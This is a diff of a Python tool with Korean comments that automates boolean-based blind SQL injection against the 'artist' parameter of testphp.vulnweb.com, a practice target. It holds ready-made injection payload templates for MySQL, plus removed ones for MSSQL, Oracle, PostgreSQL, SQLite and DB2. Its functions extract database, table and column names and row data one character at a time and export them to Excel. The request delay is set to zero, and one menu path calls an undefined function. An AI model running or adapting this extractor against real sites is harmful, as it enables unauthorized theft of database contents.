@@ -1,103 +1,28 @@
 import requests
 import pandas as pd
-from openpyxl import Workbook, load_workbook
-from openpyxl.styles import PatternFill, Font, Alignment
+from tabulate import tabulate
 import os
 import time
+from openpyxl import Workbook
+from openpyxl.styles import Font, PatternFill
 
 # 설정 정보
 url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
 param_name = "artist"  # 공격할 파라미터 이름
 true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
-sleep_time = 1.0  # 요청 간 지연 시간
+sleep_time = 0  # 요청 간 지연 시간 (초)
 
-db_type = None
-
-# SQL Injection 페이로드 템플릿 설정(payload 설정)
+# SQL Injection 페이로드 템플릿 설정
 payload_templates = {
-    "mysql": {
-        "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
-        "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
-        "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
-        "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
-    },
-    "mssql": {
-        "database_name": "1 AND SUBSTRING(DB_NAME(), {i}, 1) = '{char}' --",
-        "table_name": "1 AND SUBSTRING((SELECT name FROM sys.tables ORDER BY name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
-        "column_name": "1 AND SUBSTRING((SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}') ORDER BY column_id OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
-        "column_data": "1 AND SUBSTRING((SELECT TOP 1 {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS), {i}, 1) = '{char}' --"
-    },
-    "oracle": {
-        "database_name": "1 AND SUBSTR((SELECT sys_context('userenv','db_name') FROM dual), {i}, 1) = '{char}' --",
-        "table_name": "1 AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner=USER) WHERE rn={index}), {i}, 1) = '{char}' --",
-        "column_name": "1 AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name=UPPER('{table_name}')) WHERE rn={index}), {i}, 1) = '{char}' --",
-        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rn FROM {table_name}) WHERE rn={index}), {i}, 1) = '{char}' --"
-    },
-    "postgresql": {
-        "database_name": "1 AND SUBSTRING((SELECT current_database()), {i}, 1) = '{char}' --",
-        "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --",
-        "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --",
-        "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} OFFSET {index} LIMIT 1), {i}, 1) = '{char}' --"
-    },
-    "sqlite": {
-        "database_name": "1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='database' LIMIT 1), {i}, 1) = '{char}' --",
-        "table_name": "1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT {index}, 1), {i}, 1) = '{char}' --",
-        "column_name": "1 AND SUBSTR((SELECT name FROM pragma_table_info('{table_name}') LIMIT {index}, 1), {i}, 1) = '{char}' --",
-        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM {table_name} LIMIT {index}, 1), {i}, 1) = '{char}' --"
-    },
-    "db2": {
-        "database_name": "1 AND SUBSTR((SELECT CURRENT SERVER FROM sysibm.sysdummy1), {i}, 1) = '{char}' --",
-        "table_name": "1 AND SUBSTR((SELECT tabname FROM syscat.tables WHERE tabschema=current_schema ORDER BY tabname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --",
-        "column_name": "1 AND SUBSTR((SELECT colname FROM syscat.columns WHERE tabname='{table_name}' ORDER BY colname OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --",
-        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS FETCH FIRST 1 ROWS ONLY), {i}, 1) = '{char}' --"
-    }
+    "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
+    "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
+    "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
+    "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
 }
 
 # 참/거짓 판별 함수
 def is_true_response(response):
     return true_response_indicator in response.text
-
-# 파일 중복 방지 이름 생성 함수
-def generate_unique_filename(base_name="parameters", extension=".xlsx"):
-    counter = 1
-    filename = f"{base_name}{extension}"
-    while os.path.exists(filename):
-        filename = f"{base_name}{counter}{extension}"
-        counter += 1
-    return filename
-
-# 엑셀 파일 저장 함수 (표 형식, 상단 회색 셀, 열 너비 조정)
-def save_to_excel(data, base_filename):
-    filename = generate_unique_filename(base_name=base_filename)
-    df = pd.DataFrame(data)
-    
-    with pd.ExcelWriter(filename, engine="openpyxl") as writer:
-        df.to_excel(writer, index=False, sheet_name="Sheet1")
-        workbook = writer.book
-        sheet = workbook.active
-
-        # 상단 행 스타일 설정
-        header_fill = PatternFill(start_color="CCCCCC", end_color="CCCCCC", fill_type="solid")
-        header_font = Font(bold=True)
-        for cell in sheet[1]:
-            cell.fill = header_fill
-            cell.font = header_font
-            cell.alignment = Alignment(horizontal="center", vertical="center")
-
-        # 열 너비 조정
-        for column_cells in sheet.columns:
-            max_length = max(len(str(cell.value)) for cell in column_cells)
-            sheet.column_dimensions[column_cells[0].column_letter].width = max_length + 2
-
-    print(f"[완료] 데이터가 '{filename}' 파일로 저장되었습니다.")
-
-# 데이터 저장 여부 확인 함수
-def ask_to_save(data, base_filename="parameters"):
-    save_choice = input("데이터를 엑셀 파일로 저장하시겠습니까? (Y/N): ").strip().upper()
-    if save_choice == "Y":
-        save_to_excel(data, base_filename)
-    else:
-        print("데이터 저장이 취소되었습니다.")
 
 # 데이터베이스 이름 추출 함수
 def get_database_name():
@@ -106,7 +31,7 @@ def get_database_name():
     for i in range(1, 50):  # 최대 길이 50자 가정
         found_char = False
         for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-            payload = payload_templates[db_type]["database_name"].format(i=i, char=char)
+            payload = payload_templates["database_name"].format(i=i, char=char)
             params = {param_name: payload}
             response = send_request(params)
             time.sleep(sleep_time)  # 요청 후 지연
@@ -118,22 +43,147 @@ def get_database_name():
                 break
         if not found_char:
             break
-    print(f"[완료] 데이터베이스 이름: {db_name}")
+    print(tabulate([[db_name]] if db_name else [], headers=["Database Name"], tablefmt="grid"))
+    print(f"총 1건" if db_name else "총 0건")
     return db_name
+
+# 테이블 이름 추출 함수
+def get_table_names(limit="ALL"):
+    tables = []
+    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
+    for index in range(0, 100 if limit == "ALL" else int(limit)):  # 최대 100개 테이블 또는 사용자 지정 개수
+        table_name = ""
+        for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
+                params = {param_name: payload}
+                response = send_request(params)
+                time.sleep(sleep_time)  # 요청 후 지연
+
+                if is_true_response(response):
+                    table_name += char
+                    found_char = True
+                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                    break
+            if not found_char:
+                break
+        if table_name:
+            tables.append(table_name)
+            print(f"[테이블 발견] {index + 1}번째 테이블 이름: {table_name}")
+        else:
+            break
+    print(tabulate([[t] for t in tables] if tables else [], headers=["Table Names"], tablefmt="grid"))
+    print(f"총 {len(tables)}건")
+    return tables
+
+# 컬럼 이름 추출 함수
+def get_column_names(table_name, limit="ALL"):
+    columns = []
+    print(f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
+    for index in range(0, 100 if limit == "ALL" else int(limit)):  # 최대 100개 컬럼 또는 사용자 지정 개수
+        column_name = ""
+        for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
+                params = {param_name: payload}
+                response = send_request(params)
+                time.sleep(sleep_time)  # 요청 후 지연
+
+                if is_true_response(response):
+                    column_name += char
+                    found_char = True
+                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                    break
+            if not found_char:
+                break
+        if column_name:
+            columns.append(column_name)
+            print(f"[컬럼 발견] {index + 1}번째 컬럼 이름: {column_name}")
+        else:
+            break
+    print(tabulate([[c] for c in columns] if columns else [], headers=["Column Names"], tablefmt="grid"))
+    print(f"총 {len(columns)}건")
+    return columns
+
+# 특정 테이블 컬럼의 데이터 추출 함수
+def get_column_data(table_name, column_name, limit="ALL"):
+    data = []
+    print(f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")
+
+    for index in range(0, 100 if limit == "ALL" else int(limit)):  # 최대 100개 데이터 행 또는 사용자 지정 개수
+        row_data = ""
+        for i in range(1, 50):  # 데이터 길이 최대 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
+                params = {param_name: payload}
+                response = send_request(params)
+                time.sleep(sleep_time)  # 요청 후 지연
+
+                if is_true_response(response):
+                    row_data += char
+                    found_char = True
+                    print(f"[데이터 발견] 위치 {i}에서 '{char}' 문자 발견!")
+                    break
+            if not found_char:
+                break
+        if row_data:
+            data.append(row_data)
+            print(f"[데이터 발견] {index + 1}번째 행 데이터: {row_data}")
+        else:
+            break
+    print(tabulate([[d] for d in data] if data else [], headers=["Data"], tablefmt="grid"))
+    print(f"총 {len(data)}건")
+    return data
 
 # 요청 전송 함수
 def send_request(params):
     if request_method == "POST":
-        return requests.post(url, data=params, timeout=10, verify=False)
+        return requests.post(url, data=params, timeout=90)
     elif request_method == "GET":
-        return requests.get(url, params=params, timeout=10, verify=False)
+        return requests.get(url, params=params, timeout=90)
     else:
         raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
 
+# 엑셀 저장 함수
+def save_to_excel(data, headers, filename):
+    wb = Workbook()
+    ws = wb.active
+    ws.title = "Extracted Data"
+
+    # 헤더 작성 및 스타일 적용
+    for col_num, header in enumerate(headers, 1):
+        cell = ws.cell(row=1, column=col_num, value=header)
+        cell.font = Font(bold=True, color="FFFFFF")
+        cell.fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
+
+    # 데이터 작성
+    for row_num, row_data in enumerate(data, 2):
+        for col_num, cell_value in enumerate(row_data, 1):
+            ws.cell(row=row_num, column=col_num, value=cell_value)
+
+    # 열 너비 자동 조정
+    for col in ws.columns:
+        max_length = 0
+        col_letter = col[0].column_letter
+        for cell in col:
+            try:
+                if len(str(cell.value)) > max_length:
+                    max_length = len(str(cell.value))
+            except:
+                pass
+        adjusted_width = (max_length + 2)
+        ws.column_dimensions[col_letter].width = adjusted_width
+
+    # 엑셀 파일 저장
+    wb.save(filename)
+    print(f"[엑셀 저장 완료] 파일명: {filename}")
+
 # 명령 선택 실행 함수
 def main():
-    global request_method, db_type
-
+    global request_method
     while True:
         print("\n[옵션 선택]")
         print("1. 데이터베이스 추출")
@@ -149,34 +199,43 @@ def main():
                 print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
                 continue
 
-            db_type = input("데이터베이스 종류를 선택하세요 (mysql/mssql/oracle/postgresql/sqlite/db2): ").strip().lower()
-            if db_type not in ["mysql", "mssql", "oracle", "postgresql", "sqlite", "db2"]:
-                print("잘못된 데이터베이스 종류입니다. mysql, mssql, oracle, postgresql, sqlite, db2 중 하나를 입력하세요.")
-                continue
-
         if choice == "1":
             db_name = get_database_name()
-            ask_to_save({"Database Name": [db_name]}, "database_name")
         elif choice == "2":
             limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
             tables = get_table_names(limit)
-            ask_to_save({"Table Names": tables}, "tables")
         elif choice == "3":
-            table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
-            limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-            columns = get_column_names(table_name, limit)
-            ask_to_save({"Column Names": columns}, f"{table_name}_columns")
+            table_choice = input("1. 특정 테이블의 컬럼 추출\n2. 전체 테이블의 컬럼 추출\n선택하세요: ").strip()
+            if table_choice == "1":
+                table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
+                limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+                columns = get_column_names(table_name, limit)
+            elif table_choice == "2":
+                all_columns = get_all_columns()
+            else:
+                print("잘못된 선택입니다. 다시 입력하세요.")
         elif choice == "4":
             table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
-            column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ")
+            column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ").strip().upper()
             limit = input("추출할 데이터 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-            
-            if column_name.upper() == "ALL":
-                data = get_all_column_data(table_name, limit)
-                ask_to_save(data, f"{table_name}_all_columns_data")
+
+            if column_name == "ALL":
+                columns = get_column_names(table_name)
+                all_data = {column: get_column_data(table_name, column, limit) for column in columns}
+                max_length = max(len(v) for v in all_data.values())
+                for column in all_data:
+                    all_data[column] += [""] * (max_length - len(all_data[column]))
+                data_rows = [list(row) for row in zip(*all_data.values())]
+                print(tabulate(data_rows, headers=all_data.keys(), tablefmt="grid"))
+                save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
+                if save_choice == "Y":
+                    save_to_excel(data_rows, list(all_data.keys()), "extracted_data.xlsx")
             else:
                 data = get_column_data(table_name, column_name, limit)
-                ask_to_save({column_name: data}, f"{table_name}_{column_name}_data")
+                print(tabulate([[d] for d in data] if data else [], headers=[column_name], tablefmt="grid"))
+                save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
+                if save_choice == "Y":
+                    save_to_excel([[d] for d in data], [column_name], "extracted_data.xlsx")
         elif choice == "5":
             print("프로그램을 종료합니다.")
             break
@@ -186,4 +245,3 @@ def main():
 # 프로그램 실행
 if __name__ == "__main__":
     main()
-    
